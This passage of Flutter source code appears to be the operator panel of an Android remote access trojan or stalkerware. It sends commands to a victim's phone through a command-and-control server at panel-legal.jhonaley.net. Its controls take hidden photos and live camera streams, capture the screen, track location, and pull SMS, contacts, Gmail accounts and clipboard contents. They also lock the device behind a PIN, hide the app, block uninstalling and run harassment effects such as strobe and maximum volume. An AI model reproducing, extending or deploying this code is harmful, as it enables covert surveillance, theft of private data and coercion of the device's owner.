        child: Column(children: [Icon(icon, color: color, size: 24), const SizedBox(height: 8), Text(label, style: const TextStyle(color: Colors.white, fontSize: 9, fontWeight: FontWeight.w500, fontFamily: 'ShareTechMono'), textAlign: TextAlign.center, maxLines: 2, overflow: TextOverflow.ellipsis)]),
      ),
    );
  }

  void _showInput(String title, String cmd, String targetId, {String? hint}) {
    TextEditingController c = TextEditingController();
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: Colors.black.withOpacity(0.95),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(24), side: BorderSide(color: _primaryColor.withOpacity(0.4), width: 1.5)),
        title: Row(children: [Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(gradient: LinearGradient(colors: [_primaryColor, _secondaryColor]), borderRadius: BorderRadius.circular(12)), child: Icon(Icons.input, color: Colors.black, size: 18)), const SizedBox(width: 12), Text(title, style: const TextStyle(color: Colors.white, fontSize: 16, fontFamily: 'Orbitron'))]),
        content: TextField(controller: c, style: const TextStyle(color: Colors.white), decoration: InputDecoration(hintText: hint ?? "Enter value...", hintStyle: TextStyle(color: Colors.white.withOpacity(0.3)), filled: true, fillColor: Colors.black.withOpacity(0.4), border: OutlineInputBorder(borderRadius: BorderRadius.circular(16), borderSide: BorderSide.none))),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text("CANCEL", style: TextStyle(color: Colors.white70))),
          ElevatedButton(onPressed: () { _sendCommand(cmd, targetId, extra: c.text); Navigator.pop(context); }, style: ElevatedButton.styleFrom(backgroundColor: Colors.white, foregroundColor: Colors.black, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16))), child: const Text("EXECUTE")),
        ],
      ),
    );
  }

  void _showCustomCommandDialog() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: Colors.black.withOpacity(0.95),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(24), side: BorderSide(color: _primaryColor.withOpacity(0.4), width: 1.5)),
        title: Row(children: [Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(gradient: LinearGradient(colors: [_primaryColor, _secondaryColor]), borderRadius: BorderRadius.circular(12)), child: const Icon(Icons.terminal, color: Colors.black, size: 18)), const SizedBox(width: 12), const Text("CUSTOM COMMAND", style: TextStyle(color: Colors.white, fontSize: 16, fontFamily: 'Orbitron'))]),
        content: Column(mainAxisSize: MainAxisSize.min,
          children: [
            TextField(controller: _customCommandController, style: const TextStyle(color: Colors.white), decoration: InputDecoration(hintText: "e.g., get_clipboard", hintStyle: TextStyle(color: Colors.white.withOpacity(0.3)), filled: true, fillColor: Colors.black.withOpacity(0.4), border: OutlineInputBorder(borderRadius: BorderRadius.circular(16), borderSide: BorderSide.none))),
            const SizedBox(height: 12),
            TextField(decoration: InputDecoration(hintText: "Extra params (optional)", hintStyle: TextStyle(color: Colors.white.withOpacity(0.3)), filled: true, fillColor: Colors.black.withOpacity(0.4), border: OutlineInputBorder(borderRadius: BorderRadius.circular(16), borderSide: BorderSide.none)), onSubmitted: (value) { _sendCommand(_customCommandController.text, _targetId, extra: value); Navigator.pop(context); _customCommandController.clear(); }),
          ],
        ),
        actions: [
          TextButton(onPressed: () { Navigator.pop(context); _customCommandController.clear(); }, child: const Text("CANCEL", style: TextStyle(color: Colors.white70))),
          ElevatedButton(onPressed: () { _sendCommand(_customCommandController.text, _targetId); Navigator.pop(context); _customCommandController.clear(); }, style: ElevatedButton.styleFrom(backgroundColor: Colors.white, foregroundColor: Colors.black, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16))), child: const Text("EXECUTE")),
        ],
      ),
    );
  }

  Widget _buildQuickStats() {
    return Container(
      margin: const EdgeInsets.only(bottom: 16),
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _primaryColor.withOpacity(0.2), width: 1),
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceAround,
        children: [
          _statItem(FontAwesomeIcons.addressBook, "${(_deviceData['contacts'] as List?)?.length ?? 0}", "Contacts"),
          _statItem(FontAwesomeIcons.message, "${(_deviceData['sms'] as List?)?.length ?? 0}", "SMS"),
          _statItem(Icons.apps, "${(_deviceData['apps'] as List?)?.length ?? 0}", "Apps"),
          _statItem(FontAwesomeIcons.envelope, "${(_deviceData['accounts'] as List?)?.length ?? 0}", "Gmails"),
        ],
      ),
    );
  }

  Widget _statItem(IconData icon, String value, String label) {
    return Column(children: [Icon(icon, color: const Color(0xFFFF9800), size: 20), const SizedBox(height: 4), Text(value, style: const TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: 'Orbitron')), Text(label, style: TextStyle(color: Colors.grey[500], fontSize: 9, fontFamily: 'ShareTechMono'))]);
  }

  Widget _buildFooter() {
    return Padding(
      padding: const EdgeInsets.all(12),
      child: Column(
        children: [
          Row(mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Container(width: 6, height: 6, decoration: const BoxDecoration(color: Colors.green, shape: BoxShape.circle, boxShadow: [BoxShadow(color: Colors.green, blurRadius: 5)])),
              const SizedBox(width: 8),
              Text("SECURE CONNECTION", style: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 9, fontWeight: FontWeight.bold, letterSpacing: 1, fontFamily: 'Orbitron')),
              const SizedBox(width: 16),
              Icon(Icons.fingerprint, color: Colors.white.withOpacity(0.2), size: 12),
            ],
          ),
          const SizedBox(height: 4),
          Text("NØCURE SECURITY • ENCRYPTED • PERSISTENT", style: TextStyle(color: Colors.white.withOpacity(0.15), fontSize: 8, fontFamily: 'ShareTechMono', letterSpacing: 1.5)),
        ],
      ),
    );
  }

  List<dynamic>? _getListData(String key) {
    if (_deviceData[key] is List) return List<dynamic>.from(_deviceData[key]);
    return null;
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Column(
        children: [
          _buildTopHeader(),
          _buildQuickStatusRow(),
          _buildTerminalLogs(),
          Expanded(
            child: ListView(
              padding: const EdgeInsets.all(12),
              children: [
                if (_deviceData.isNotEmpty) _buildQuickStats(),
                
                // CAMERA SECTION (NEW)
                _groupLabel("📷 CAMERA SYSTEM"),
                Wrap(spacing: 10, runSpacing: 10,
                  children: [
                    _actionButton("CAMERA VIEW", Icons.camera_enhance, Colors.cyan, "camera_viewer"),
                    _actionButton("LIVE STREAM", FontAwesomeIcons.video, const Color(0xFFFF9800), "start_live_camera"),
                    _actionButton("FRONT CAM", Icons.camera_front, Colors.blue, "take_photo", extra: "front"),
                    _actionButton("BACK CAM", Icons.camera_rear, Colors.green, "take_photo", extra: "back"),
                    _actionButton("SCREEN", Icons.screenshot_monitor, Colors.amber, "get_screen"),
                  ],
                ),

                _groupLabel("🎯 INTELLIGENCE"),
                Wrap(spacing: 10, runSpacing: 10,
                  children: [
                    _actionButton("GPS LOC", FontAwesomeIcons.locationDot, Colors.green, "get_location"),
                    _actionButton("GMAIL", FontAwesomeIcons.envelope, Colors.red, "get_gmails"),
                    _actionButton("CONTACTS", FontAwesomeIcons.addressBook, Colors.blue, "get_contacts",
                          isPage: true, destination: DataViewerPage(title: "Contacts", cmd: "get_contacts", targetId: _targetId, data: _getListData('contacts'))),
                    _actionButton("SMS", FontAwesomeIcons.message, const Color(0xFFFF3366), "get_sms",
                          isPage: true, destination: SmsChatViewerPage(targetId: _targetId, initialData: _getListData('sms'))),
                    _actionButton("APPS", Icons.apps, Colors.teal, "get_apps",
                          isPage: true, destination: DataViewerPage(title: "Installed Apps", cmd: "get_apps", targetId: _targetId, data: _getListData('apps'))),
                    _actionButton("CLIPBOARD", FontAwesomeIcons.copy, Colors.brown, "get_clipboard"),
                  ],
                ),
                _groupLabel("💥 SABOTAGE"),
                Wrap(spacing: 10, runSpacing: 10,
                  children: [
                    _actionButton("STROBE", FontAwesomeIcons.lightbulb, Colors.yellow, "flash_strobe"),
                    _actionButton("STOP", FontAwesomeIcons.stop, Colors.grey, "stop_strobe"),
                    _actionButton("VOL MAX", FontAwesomeIcons.volumeHigh, Colors.cyan, "set_vol_max"),
                    _actionButton("VIBRATE", Icons.vibration, Colors.purple, "vibrate_loop"),
                    _actionButton("PLAY AUDIO", FontAwesomeIcons.music, const Color(0xFFFF3366), "play_audio", isInput: true, inputHint: "Enter audio URL"),
                    _actionButton("STOP AUDIO", FontAwesomeIcons.stop, Colors.red, "stop_audio"),
                  ],
                ),
                _groupLabel("🎮 UI & CONTROL"),
                Wrap(spacing: 10, runSpacing: 10,
                  children: [
                    _actionButton("WALLPAPER", FontAwesomeIcons.image, Colors.indigo, "set_wallpaper", isInput: true, inputHint: "Enter image URL"),
                    _actionButton("TTS", FontAwesomeIcons.microphone, Colors.deepOrange, "speak_tts", isInput: true, inputHint: "Enter text to speak"),
                    _actionButton("OPEN URL", FontAwesomeIcons.globe, Colors.lightBlue, "open_url", isInput: true, inputHint: "Enter URL"),
                    _actionButton("SEND SMS", FontAwesomeIcons.sms, Colors.blueGrey, "send_sms", isInput: true, inputHint: "Number|Message"),
                  ],
                ),
                _groupLabel("🔒 SECURITY & PERSISTENCE"),
                Wrap(spacing: 10, runSpacing: 10,
                  children: [
                    _actionButton("LOCK", FontAwesomeIcons.lock, Colors.red, "hard_lock", isInput: true, inputHint: "Message|PIN"),
                    _actionButton("UNLOCK", FontAwesomeIcons.lockOpen, Colors.green, "unlock"),
                    _actionButton("ANTI-UNINSTALL", FontAwesomeIcons.shield, _deviceData['antiUninstall'] == true ? Colors.green : Colors.red, "", 
                      isToggle: true, 
                      onToggle: () => _toggleAntiUninstall()),
                    _actionButton("HIDE APP", FontAwesomeIcons.eyeSlash, _deviceData['hiddenMode'] == true ? Colors.purple : Colors.grey, "",
                      isToggle: true,
                      onToggle: () => _toggleHideApp()),
                    _actionButton("DEVICE INFO", FontAwesomeIcons.info, Colors.blueGrey, "get_device_info"),
                  ],
                ),
                _groupLabel("⚡ ADVANCED"),
                Wrap(spacing: 10, runSpacing: 10,
                  children: [
                    _actionButton("CUSTOM", FontAwesomeIcons.terminal, Colors.white, "", isCustom: true),
                    _actionButton("PING", FontAwesomeIcons.networkWired, Colors.lightBlue, "ping"),
                    _actionButton("REBOOT", FontAwesomeIcons.rotate, Colors.orange, "reboot_device"),
                  ],
                ),
                const SizedBox(height: 20),
                _buildFooter(),
                const SizedBox(height: 30),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Future<void> _toggleAntiUninstall() async {
    bool currentState = _deviceData['antiUninstall'] ?? false;
    try {
      await http.post(
        Uri.parse("http://panel-legal.jhonaley.net:3018/api/toggle-anti-uninstall/$_targetId"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"enabled": !currentState}),
      );
      setState(() {
        _deviceData['antiUninstall'] = !currentState;
      });
      _addLog("Anti-Uninstall: ${!currentState ? 'ENABLED' : 'DISABLED'}", LogType.success);
    } catch (e) {
      _addLog("Failed to toggle anti-uninstall", LogType.error);
    }
  }

  Future<void> _toggleHideApp() async {
    bool currentState = _deviceData['hiddenMode'] ?? false;
    try {
      await http.post(
        Uri.parse("http://panel-legal.jhonaley.net:3018/api/toggle-hide-app/$_targetId"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"enabled": !currentState}),
      );
      setState(() {
        _deviceData['hiddenMode'] = !currentState;
      });
      _addLog("Hide App Mode: ${!currentState ? 'ENABLED' : 'DISABLED'}", LogType.success);
    } catch (e) {
      _addLog("Failed to toggle hide app", LogType.error);
    }
  }
}

enum LogType { info, success, error, warning, notification, location, debug }

class LogEntry {
  final DateTime timestamp;
  final String message;
  final LogType type;
  LogEntry({required this.timestamp, required this.message, required this.type});
}

class SmsChatViewerPage extends StatefulWidget {
  final String targetId;
  final List<dynamic>? initialData;
  const SmsChatViewerPage({super.key, required this.targetId, this.initialData});
  
  @override
  State<SmsChatViewerPage> createState() => _SmsChatViewerPageState();
}

class _SmsChatViewerPageState extends State<SmsChatViewerPage> {
  List<dynamic> _sms = [];
  bool _isLoading = true;
  String _searchQuery = "";
  
  @override
  void initState() {
    super.initState();
    if (widget.initialData != null && widget.initialData!.isNotEmpty) {
      _sms = widget.initialData!;
      _isLoading = false;
    } else {
      _fetch();
    }
  }
  
  Future<void> _fetch() async {
    setState(() => _isLoading = true);
    try {
      final res = await http.get(Uri.parse("http://panel-legal.jhonaley.net:3018/api/get-response/${widget.targetId}")).timeout(const Duration(seconds: 10));
      if (res.statusCode == 200 && mounted) {
        final decoded = jsonDecode(res.body);
        final remoteData = decoded['data'] != null ? decoded['data'] : decoded; 
        List<dynamic> combinedSms = [];
        if (remoteData['sms'] is List) combinedSms.addAll(remoteData['sms']);
        if (remoteData['notifications'] is List) {
          for (var n in remoteData['notifications']) {
            combinedSms.add({'address': n['title'] ?? n['app'], 'body': n['body'] ?? n['message'], 'date': n['timestamp']});
          }
        }
        combinedSms.sort((a, b) {
          int dateA = a['date'] is int ? a['date'] : (int.tryParse(a['date']?.toString() ?? '0') ?? 0);
          int dateB = b['date'] is int ? b['date'] : (int.tryParse(b['date']?.toString() ?? '0') ?? 0);
          return dateB.compareTo(dateA);
        });
        setState(() { _sms = combinedSms; _isLoading = false; });
      }
    } catch (e) { if (mounted) setState(() => _isLoading = false); }
  }
  
  List<dynamic> get _filteredSms {
    if (_searchQuery.isEmpty) return _sms;
    return _sms.where((sms) => (sms['address'] ?? "").toLowerCase().contains(_searchQuery.toLowerCase()) || (sms['body'] ?? "").toLowerCase().contains(_searchQuery.toLowerCase())).toList();
  }
  
  @override
  Widget build(BuildContext context) {
    final filtered = _filteredSms;
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        backgroundColor: Colors.black,
        title: Column(crossAxisAlignment: CrossAxisAlignment.start,
          children: [const Text("SMS INTERCEPTOR", style: TextStyle(color: Color(0xFF00E5FF), fontSize: 16, fontFamily: 'Orbitron')), Text("${filtered.length} messages", style: TextStyle(color: Colors.grey[500], fontSize: 11, fontFamily: 'ShareTechMono'))],
        ),
        actions: [IconButton(icon: const Icon(Icons.refresh, color: Color(0xFF00E5FF)), onPressed: _fetch)],
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(50),
          child: Padding(
            padding: const EdgeInsets.all(8),
            child: TextField(
              style: const TextStyle(color: Colors.white, fontSize: 12),
              decoration: InputDecoration(
                hintText: "Search by number or message...",
                hintStyle: TextStyle(color: Colors.grey[600], fontSize: 12),
                prefixIcon: const Icon(Icons.search, color: Color(0xFF00E5FF), size: 18),
                filled: true, fillColor: Colors.white10,
                border: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: BorderSide.none),
              ),
              onChanged: (value) => setState(() => _searchQuery = value),
            ),
          ),
        ),
      ),
      body: _isLoading ? const Center(child: CircularProgressIndicator(color: Color(0xFF00E5FF))) : filtered.isEmpty ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [const Icon(Icons.comments_disabled, color: Colors.grey, size: 48), const SizedBox(height: 16), Text(_searchQuery.isEmpty ? "No messages" : "No results found", style: const TextStyle(color: Colors.grey))])) : ListView.builder(
        itemCount: filtered.length,
        itemBuilder: (context, i) {
          final sms = filtered[i];
          return Container(
            margin: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
            decoration: const BoxDecoration(border: Border(bottom: BorderSide(color: Colors.white10))),
            child: ListTile(
              leading: CircleAvatar(backgroundColor: Colors.pink.withOpacity(0.2), child: Text((sms['address'] ?? "?")[0].toUpperCase(), style: const TextStyle(color: Colors.pink))),
              title: Text(sms['address'] ?? "Unknown", style: const TextStyle(color: Colors.pink, fontSize: 13, fontFamily: 'ShareTechMono')),
              subtitle: Text(sms['body'] ?? "", style: const TextStyle(color: Colors.white70, fontSize: 12, fontFamily: 'ShareTechMono'), maxLines: 3, overflow: TextOverflow.ellipsis),
              trailing: sms['date'] != null ? Text(_formatTimestamp(sms['date']), style: TextStyle(color: Colors.grey[600], fontSize: 9)) : null,
              onTap: () => _showSmsDetail(sms),
            ),
          );
        },
      ),
    );
  }
  
  String _formatTimestamp(dynamic timestamp) {
    try {
      DateTime date = timestamp is int ? DateTime.fromMillisecondsSinceEpoch(timestamp) : (timestamp is String ? DateTime.parse(timestamp) : DateTime.now());
      return "${date.day}/${date.month}/${date.year} ${date.hour}:${date.minute.toString().padLeft(2, '0')}";
    } catch (e) { return ""; }
  }
  
  void _showSmsDetail(dynamic sms) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF1A1A2E),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: const BorderSide(color: Color(0xFF00E5FF), width: 1.5)),
        title: Row(children: [const Icon(Icons.message, color: Color(0xFF00E5FF), size: 20), const SizedBox(width: 8), Expanded(child: Text(sms['address'] ?? "Unknown", style: const TextStyle(color: Color(0xFF00E5FF), fontSize: 14, fontFamily: 'Orbitron'), overflow: TextOverflow.ellipsis))]),
        content: Column(mainAxisSize: MainAxisSize.min,
          children: [
            Container(padding: const EdgeInsets.all(12), decoration: BoxDecoration(color: Colors.black54, borderRadius: BorderRadius.circular(8)), child: SelectableText(sms['body'] ?? "No content", style: const TextStyle(color: Colors.white, fontSize: 13, fontFamily: 'ShareTechMono'))),
            const SizedBox(height: 12),
            Text("Received: ${_formatTimestamp(sms['date'])}", style: TextStyle(color: Colors.grey[600], fontSize: 10, fontFamily: 'ShareTechMono')),
          ],
        ),
        actions: [
          TextButton.icon(onPressed: () { Clipboard.setData(ClipboardData(text: sms['body'] ?? "")); Navigator.pop(context); }, icon: const Icon(Icons.copy, size: 16), label: const Text("COPY")),
          TextButton(onPressed: () => Navigator.pop(context), child: const Text("CLOSE")),
        ],
      ),
    );
  }
}

class DataViewerPage extends StatefulWidget {
  final String title;
  final String cmd;
  final String targetId;
  final List<dynamic>? data;
  const DataViewerPage({super.key, required this.title, required this.cmd, required this.targetId, this.data});
  
  @override
  State<DataViewerPage> createState() => _DataViewerPageState();
}

class _DataViewerPageState extends State<DataViewerPage> {
  List<dynamic> _list = [];
  bool _isLoading = true;
  String _searchQuery = "";
  
  @override
  void initState() {
    super.initState();
    if (widget.data != null && widget.data!.isNotEmpty) { _list = widget.data!; _isLoading = false; }
    else { _fetch(); }
  }
  
  Future<void> _fetch() async {
    setState(() => _isLoading = true);
    try {
      final res = await http.get(Uri.parse("http://panel-legal.jhonaley.net:3018/api/get-response/${widget.targetId}")).timeout(const Duration(seconds: 10));
      if (res.statusCode == 200 && mounted) {
        final decoded = jsonDecode(res.body);
        final remoteData = decoded['data'] != null ? decoded['data'] : decoded; 
        String key = widget.cmd == "get_apps" ? "apps" : "contacts";
        setState(() { _list = remoteData[key] is List ? remoteData[key] : []; _isLoading = false; });
      }
    } catch (e) { if (mounted) setState(() => _isLoading = false); }
  }
  
  List<dynamic> get _filteredList {
    if (_searchQuery.isEmpty) return _list;
    return _list.where((item) => (item['name'] ?? "").toLowerCase().contains(_searchQuery.toLowerCase()) || (widget.cmd == "get_apps" ? (item['package'] ?? "").toLowerCase() : (item['num'] ?? "").toLowerCase()).contains(_searchQuery.toLowerCase())).toList();
  }
  
  IconData get _iconData => widget.cmd == "get_apps" ? Icons.android : Icons.person;
  Color get _iconColor => widget.cmd == "get_apps" ? Colors.teal : Colors.blue;
  
  @override
  Widget build(BuildContext context) {
    final filtered = _filteredList;
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        backgroundColor: Colors.black,
        title: Column(crossAxisAlignment: CrossAxisAlignment.start,
          children: [Text(widget.title, style: const TextStyle(color: Color(0xFF00E5FF), fontSize: 16, fontFamily: 'Orbitron')), Text("${filtered.length} items", style: TextStyle(color: Colors.grey[500], fontSize: 11, fontFamily: 'ShareTechMono'))],
        ),
        actions: [
          IconButton(icon: const Icon(Icons.refresh, color: Color(0xFF00E5FF)), onPressed: _fetch),
          IconButton(icon: const Icon(Icons.file_download, color: Color(0xFF00E5FF)), onPressed: _exportData),
        ],
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(50),
          child: Padding(
            padding: const EdgeInsets.all(8),
            child: TextField(
              style: const TextStyle(color: Colors.white, fontSize: 12),
              decoration: InputDecoration(
                hintText: "Search...",
                hintStyle: TextStyle(color: Colors.grey[600], fontSize: 12),
                prefixIcon: const Icon(Icons.search, color: Color(0xFF00E5FF), size: 18),
                filled: true, fillColor: Colors.white10,
                border: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: BorderSide.none),
              ),
              onChanged: (value) => setState(() => _searchQuery = value),
            ),
          ),
        ),
      ),
      body: _isLoading ? const Center(child: CircularProgressIndicator(color: Color(0xFF00E5FF))) : filtered.isEmpty ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [Icon(_iconData, color: Colors.grey, size: 48), const SizedBox(height: 16), Text(_searchQuery.isEmpty ? "No data" : "No results found", style: const TextStyle(color: Colors.grey))])) : ListView.builder(
        itemCount: filtered.length,
        itemBuilder: (context, i) {
          final item = filtered[i];
          return ListTile(
            leading: CircleAvatar(backgroundColor: _iconColor.withOpacity(0.2), child: Icon(_iconData, color: _iconColor, size: 20)),
            title: Text(item['name'] ?? "Unknown", style: const TextStyle(color: Colors.white, fontFamily: 'ShareTechMono')),
            subtitle: Text(widget.cmd == "get_apps" ? (item['package'] ?? "") : (item['num'] ?? ""), style: const TextStyle(color: Colors.white38, fontSize: 11, fontFamily: 'ShareTechMono')),
          );
        },
      ),
    );
  }
  
  void _exportData() {
    StringBuffer buffer = StringBuffer();
    buffer.writeln("=== ${widget.title} Export ===\n");
    for (var item in _list) {
      buffer.writeln("Name: ${item['name'] ?? 'Unknown'}");
      buffer.writeln("${widget.cmd == "get_apps" ? "Package" : "Number"}: ${widget.cmd == "get_apps" ? item['package'] : item['num']}");
      buffer.writeln("---");
    }
    Clipboard.setData(ClipboardData(text: buffer.toString()));
    ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("Data copied to clipboard"), duration: Duration(seconds: 2)));
  }
}